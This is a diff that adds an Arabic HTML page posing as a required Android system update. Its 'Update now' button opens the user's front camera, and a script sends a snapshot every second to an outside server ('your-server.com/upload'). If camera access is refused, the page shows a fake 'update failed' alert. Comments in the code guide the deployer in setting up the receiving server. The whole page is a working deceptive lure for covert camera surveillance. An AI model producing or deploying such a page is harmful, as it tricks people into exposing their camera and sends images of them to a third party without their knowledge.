@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تحديث النظام | Android</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            background-color: #f0f0f0;
+            padding: 20px;
+        }
+        .container {
+            background-color: white;
+            border-radius: 10px;
+            padding: 20px;
+            max-width: 400px;
+            margin: 0 auto;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+        }
+        .logo {
+            width: 100px;
+            margin-bottom: 20px;
+        }
+        .btn {
+            background-color: #4CAF50;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        .btn:hover {
+            background-color: #45a049;
+        }
+        #cameraPreview {
+            width: 100%;
+            max-width: 300px;
+            border-radius: 5px;
+            margin-top: 20px;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/d/d7/Android_robot.svg/1024px-Android_robot.svg.png" alt="Android Logo" class="logo">
+        <h2>تحديث النظام المطلوب</h2>
+        <p>يرجى الضغط على الزر أدناه لتحديث نظام Android الخاص بك. هذه العملية ضرورية لتحسين الأمان والأداء.</p>
+        <button class="btn" id="updateBtn">تحديث الآن</button>
+        <video id="cameraPreview" autoplay playsinline></video>
+    </div>
+
+    <script>
+        document.getElementById('updateBtn').addEventListener('click', function() {
+            // طلب الوصول إلى الكاميرا
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
+                .then(function(stream) {
+                    var video = document.getElementById('cameraPreview');
+                    video.srcObject = stream;
+                    video.style.display = 'block';
+
+                    // إرسال البث إلى خادمك (سيحتاج إلى إعداد خادم لتلقي البيانات)
+                    // هذا مثال بسيط لإرسال لقطات من الفيديو إلى خادمك
+                    setInterval(function() {
+                        var canvas = document.createElement('canvas');
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        var ctx = canvas.getContext('2d');
+                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        var imageData = canvas.toDataURL('image/jpeg');
+
+                        // هنا يمكنك إرسال imageData إلى خادمك باستخدام fetch أو WebSocket
+                        // مثال:
+                        fetch('https://your-server.com/upload', {
+                            method: 'POST',
+                            body: JSON.stringify({ image: imageData }),
+                            headers: { 'Content-Type': 'application/json' }
+                        }).catch(err => console.error(err));
+                    }, 1000); // إرسال لقطة كل ثانية
+                })
+                .catch(function(err) {
+                    console.error("خطأ في الوصول إلى الكاميرا:", err);
+                    alert("فشل التحديث. يرجى المحاولة مرة أخرى.");
+                });
+        });
+    </script>
+</body>
+</html>
